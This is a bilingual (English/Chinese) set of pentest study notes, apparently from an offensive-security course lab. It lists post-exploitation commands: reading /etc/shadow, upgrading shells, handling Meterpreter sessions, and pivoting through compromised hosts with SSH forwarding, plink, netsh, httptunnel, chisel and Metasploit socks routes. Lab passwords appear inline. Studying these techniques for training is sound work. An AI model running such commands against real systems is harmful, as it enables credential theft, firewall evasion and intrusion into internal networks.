
# Enum

## Linux

### hashes

```
cat /etc/shadow
```

### network connections
if this machine is communicating to any other machine in the network currently
```
netstat -antup
```

### db
information stored in db
```
mysql -uroot -pzaq1xsw2cde3 -e 'show databases;'
```

### user folder
> * user's home folders are not always set to /home, also check /etc/passwd
> * .*_history, .ssh, .gpg
```
ls -lahR /home/
cat /etc/passwd
```

### GUI
information saved in web browser and desktop
> e.g. history, saved passwords, homepage, recently opened app/files

```
pid of X
```

## windows


# Spawning shells

## Non-interactive  tty-shell 
* 交互式shell
> 交互式模式就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了

* 非交互式shell
> 以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾EOF，shell也就终止了。

查看
```
echo $-

himBH  // i 表示交互shell
```

* upgrade to tty-shell
https://www.metahackers.pro/spawing-tty-shells/

```
#python
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

#Echo
echo 'os.system('/bin/bash')'

#sh
/bin/sh -i

#bash
/bin/bash -i

#Perl
perl -e 'exec "/bin/sh";'

#From within VI
:!bash
```

## Interactive tty-shells

受限的交互式shell，上下键、tab键不可用等，使用socat

https://github.com/cornerpirate/socat-shell


## Meterpreter shell

### basic
```
help
help upload

#sessions 
background -l  //list background sessions

background -i 1 //connect back to bg session
upload  //upload file
download
```

### Scripts
migrate session  to another process
防止程序关闭导致shell失效

```
ps
run migrate -p [pid]
```

### Post module
normal shell 升级为 meterpreter

```
Ctrl-z  //退出shell，不关闭连接

show sessions  // 查看链接
sessions -l 

sessions -i 1  // connect

use post/multi/manage/shell_to_meterpreter
set LHOST 192.168.1.2
set session 1
exploit
```






# Povit
Port Redirection and Tunneling

## port forwarding
```
sudo apt update && sudo apt install rinetd
cat /etc/rinetd.conf

0.0.0.0 80 216.58.207.142 80  //kali上80端口转发至google 80端口

sudo  service rinetd restart
ss -antp | grep 80

debian
nc -nvv kaliip 80

20.1.1.1 Exercises
1. Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.
2. Attempt to replicate the port-forwarding technique covered in the above scenario.
```

## SSH local port forwarding

kali internet
debian，内网，无internt，已有root、student；10.11.0.128
windows 16 与debian 同 192 网段；192.168.1.110
kali 访问windows 服务， debian 作为host转发 ssh local forward
kali 445 转发 至window 445， kali 访问本地445 就像访问window 445；通过22端口，防火墙无法检测；

```
ssh -N -L [bind_address:]port:host:hostport [username@address]
//场景描述

/root/port_forwarding_and_tunneling/ssh_local_port_forwarding.sh
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128

vim /etc/samba/smb.conf //修改 smb，win server 2016 不支持smbv1
min protocol = SMB2

sudo /etc/init.d/smbd restart

smbclient -L 127.0.0.1 -U Administrator

20.2.1.1 Exercises
1. Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.
2. Run the ssh_local_port_forwarding.sh script from /root/port_forwarding_and_tunneling/ as root.
3. Take note of the Linux client and Windows Server 2016 IP addresses shown in the Student Control Panel.
4. Attempt to replicate the smbclient enumeration covered in the above scenario.
```

## ssh remote port forward

reverse of local port forwarding， port open on remote side of connection, traffic sent to the port is forwarding to a port on local machine.CommanderKeenVorticons1990
场景：
debian, internal network, open 3306, block inbound 22, 无法ssh连接。已有non-root shell； ssh 至 kali，开启 端口转发至 3306
kali，internet；sshd，open port 2221，转发traffic 至 3306；kali本地访问2221相当于访问debian 3306

```
ssh -N -R [bind_address:]port:host:hostport [username@address]

/root/port_forwarding_and_tunneling/ssh_remote_port_forwarding.sh
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4

ss -antp | grep "2221"

sudo nmap -sS -sV 127.0.0.1 -p 2221

20.2.2.1 Exercises
1. Connect to your dedicated Linux lab client via SSH and run the clear_rules.sh script from
/root/port_forwarding_and_tunneling/ as root.
2. Close any SSH connections to your dedicated Linux lab client and then connect as the
student account using rdesktop and run the ssh_remote_port_forward.sh script from
/root/port_forwarding_and_tunneling/ as root.
3. Attempt to replicate the SSH remote port forwarding covered in the above scenario and
ensure that you can scan and interact with the MySQL service.
```

## ssh dynamic port forwarding

debian, compromised, connect to 10 and 192 network，sshd
windows，192 network
kali，ssh to debian，open local port 8080(socks4, -N -D) tunnel all incoming traffic to any host in 192 network; proxychains 代理本地连接

```
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>

sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110

20.2.3.1 Exercises
1. Connect to your dedicated Linux lab client and run the clear_rules.sh script from
/root/port_forwarding_and_tunneling/ as root.
2. Take note of the Linux client and Windows Server 2016 IP addresses.
3. Create a SOCKS4 proxy on your Kali machine, tunneling through the Linux target.
4. Perform a successful nmap scan against the Windows Server 2016 machine through the
proxy.
5. Perform an nmap SYN scan through the tunnel. Does it work? Are the results accurate?
```

## win-remote port forwarding

win，内网，防火墙规则禁止直接访问3306
kali，外网；sshd, 已有win shell
通过plink 绕过限制，访问3306

plink,windows-based command line ssh client.
http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html

```
//-R remote port forward
plink.exe -ssh -l kali -pw password -R kaliip:kaliport:127.0.0.1:3306 kaliip

//交互提示是否存储key导致失败，
cmd.exe /c echo y | plink.exe -ssh -l kali -pw password -R kaliip:kaliport:127.0.0.1:3306 kaliip

sudo nmap -sS -sV 127.0.0.1 -p 1234

20.3.1.1 Exercises
1. Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.
2. Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10
client.
3. Scan the MySQL port via the remote port forward.
```

## win-netsh
win10， compromised on  ip 10.xx， 接入 192.xx 网络
win16,445端口开放，192网段
通过win10 本地端口转发，访问win16 445

netsh, installed by default on windows; port forwarding and pivoting
iphelper ipv6 需开启

https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts

```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=win10ip10tag connectport=445 connectaddress=win16-192ip
netstat -anp TCP | find "4455"

//本地端口转发，443 转发至 196:443
netsh interface portproxy add v4tov4 listenport=443 listenaddress=172.16.196.10 connectport=443 connectaddress=192.168.119.196
//删除 443 转发

netsh interface portproxy delte v4tov4 listenport=443
//添加 firewall
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=out remoteip=192.168.119.196 remoteport=4443 action=allow

//添加firewall  rule
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow

smbclient -L 10.11.0.22 --port=4455 --user=Administrator
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o
username=Administrator,password=Qwerty09! /mnt/win10_share

20.4.1.1 Exercise
1. Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.
2. Using the SYSTEM shell, attempt to replicate the port forwarding example using netsh.
```

## win-HTTPTunnel-ling 
**HTTPTunnel-ling through deep package inspection**

linux，compromised，have root and student； firewall allow 80，443,1234 inbound and outbound；
kali，443 获取到linux shell
通过HTTPTunnel，从kali 访问windows（RDP）

kali 8080 -- linux 1234 - linux 8888 - windows 3389
```
apt-cache search httptunnel
sudo apt install httptunnel
/root/port_forwarding_and_tunneling/http_tunneling.sh

// local port forward, 8888 - win 3389
debian:ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
ss -antp | grep "8888"

//create httptunnel， listen1234 forward to 8888
hts --forward-port localhost:8888 1234
ps aux | grep hts
ss -antp | grep "1234"

//kali, httptunnel, 8080（3389）协议封装在https协议，转发到1234
htc --forward-port 8080 10.11.0.128:1234
ps aux | grep htc
ss -antp | grep "8080"

20.5.1.1 Exercises
1. Connect to your dedicated Linux lab client as the student account using rdesktop and run the
http_tunneling.sh script from /root/port_forwarding_and_tunneling/ as root.
2. Start the apache2 service and exploit the vulnerable web application hosted on port 443
(covered in a previous module) in order to get a reverse HTTP shell.599
3. Replicate the scenario demonstrated above using your dedicated clients.
```

## chisel
+ download, https://github.com/jpillora/chisel
+ [tunneling with chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+ [htb-buff](https://0xdf.gitlab.io/2020/11/21/htb-buff.html#tunnel)

```
# dynamic proxy, socks5; 
## kali本地启动1080 socks5代理
## kali
./chisel_linamd64 server -p 8000 --reverse

## target
.\chisel64.exe client [kaliip]:8000 R:socks

# proxy 反向代理
## target 本地端口8888端口开放，通过chisel转发端口到kali 8888
##kali
./chisel_linamd64 server -p 8000 --reverse

## target
.\chisel64.exe client 10.10.14.3:8000 R:8888:localhost:8888
```

## metasploit socks
+ post/multi/manage/autoroute add the route
+ auxiliary/server/socks_proxy, start proxy

```bash
# add subnet
use post/multi/manage/autoroute
set session 1
run

# start socks proxy
use auxiliary/server/socks_proxy
show options
## change the port or not, default 1080
run -j

# add the socks to /etc/proxychains4.conf 
socks5  127.0.0.1 1080

# delete route
use post/multi/manage/autoroute
show options
set cmd delete
run 

route flush

## then add new subnet
set session 1
set cmd autoadd
run
route 
```


